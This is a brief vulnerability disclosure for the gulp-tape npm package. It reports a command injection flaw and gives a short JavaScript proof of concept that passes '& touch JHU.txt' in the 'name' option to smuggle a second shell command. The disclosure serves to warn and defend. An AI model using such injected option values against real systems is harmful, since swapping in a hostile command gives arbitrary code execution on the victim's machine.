# Overview
`gulp-tape` is a to run Tape tests in Gulp, this package are vulnerable to Command Injection. It is possible to inject arbitrary commands as part of `gulp-tape` options.

# Proof of Concept
```
var root = require("gulp-tape");
var gulp = require("gulp");
var options = {
  name: "& touch JHU.txt"
}
gulp.src("./gulp-tape.js")
  .pipe(root(options));
```